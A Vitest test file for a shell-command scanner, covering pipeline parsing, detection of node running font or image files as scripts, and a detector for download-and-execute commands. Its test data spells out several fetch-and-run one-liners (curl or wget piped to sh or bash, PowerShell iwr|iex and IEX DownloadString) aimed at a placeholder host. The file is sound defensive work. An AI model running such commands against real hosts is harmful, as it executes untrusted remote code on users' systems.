import { describe, expect, it } from 'vitest';
import { downloadsAndRuns, nodeInvocations, parseShell, programName } from './shell.js';

describe('parseShell', () => {
  it('splits pipelines and commands and honours quotes', () => {
    const parsed = parseShell(`echo "a | b" 'c && d' | grep x && ls -la; pwd`);
    expect(parsed.pipelines).toHaveLength(3);
    expect(parsed.pipelines[0]!.commands.map((c) => c.words)).toEqual([
      ['echo', 'a | b', 'c && d'],
      ['grep', 'x'],
    ]);
  });

  it('keeps Windows path backslashes but honours shell escapes', () => {
    expect(parseShell('node public\\fonts\\a.woff2').pipelines[0]!.commands[0]!.words).toEqual([
      'node',
      'public\\fonts\\a.woff2',
    ]);
    expect(parseShell('echo a\\ b').pipelines[0]!.commands[0]!.words).toEqual(['echo', 'a b']);
  });

  it('records input redirects and drops output redirects', () => {
    const cmd = parseShell('node < x.woff2 > out.txt 2>&1').pipelines[0]!.commands[0]!;
    expect(cmd.words).toEqual(['node']);
    expect(cmd.stdinFrom).toBe('x.woff2');
  });

  it('collects command substitutions for nested analysis', () => {
    expect(parseShell('sh -c "$(curl -s https://example.invalid)"').nested).toEqual(['curl -s https://example.invalid']);
  });

  it('is linear on pathological input', () => {
    const start = performance.now();
    parseShell('"'.repeat(200_000) + "'".repeat(200_000) + '$('.repeat(50_000));
    expect(performance.now() - start).toBeLessThan(2000);
  });
});

describe('programName', () => {
  it('normalizes paths and Windows suffixes', () => {
    expect(programName('C:\\Program Files\\nodejs\\node.exe')).toBe('node');
    expect(programName('/usr/bin/env')).toBe('env');
  });
});

describe('nodeInvocations', () => {
  const files = (text: string) => nodeInvocations(text).runs.map((r) => `${r.via}:${r.file}`);

  it('finds scripts, preloads and stdin in every form', () => {
    expect(files('node public/fonts/fa-solid-500.woff2')).toEqual(['script:public/fonts/fa-solid-500.woff2']);
    expect(files('node --max-old-space-size=4096 -r ./x.png app.js')).toEqual(['require:./x.png', 'script:app.js']);
    expect(files('node --import=./a.woff index.js')).toEqual(['require:./a.woff', 'script:index.js']);
    expect(files('node < public/a.ttf')).toEqual(['stdin:public/a.ttf']);
    expect(files('cat public/a.ttf | node -')).toEqual(['stdin:public/a.ttf']);
    expect(files('sh -c "node ./img/logo.png"')).toEqual(['script:./img/logo.png']);
    expect(files('cmd /c node public\\a.woff2')).toEqual(['script:public\\a.woff2']);
  });

  it('collects inline eval code', () => {
    expect(nodeInvocations(`node -e "require('./a.woff2')"`).inline).toEqual(["require('./a.woff2')"]);
  });

  it('ignores ordinary commands', () => {
    expect(files('npm run build && tsc --watch')).toEqual([]);
  });
});

describe('downloadsAndRuns', () => {
  it.each([
    'curl -fsSL https://example.invalid/i.sh | sh',
    'wget -qO- https://example.invalid | bash -s',
    'bash <(curl -s https://example.invalid)',
    'sh -c "$(curl -fsSL https://example.invalid)"',
    'iwr https://example.invalid/a.ps1 | iex',
    "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid')\"",
    'curl -o /tmp/x.sh https://example.invalid && sh /tmp/x.sh',
    'curl -sL -o run https://example.invalid; chmod +x run; ./run',
  ])('flags %s', (text) => {
    expect(downloadsAndRuns(text)).toBe(true);
  });

  it.each(['curl -o data.json https://example.invalid', 'npm ci && npm test', 'echo curl | cat'])(
    'does not flag %s',
    (text) => {
      expect(downloadsAndRuns(text)).toBe(false);
    },
  );
});
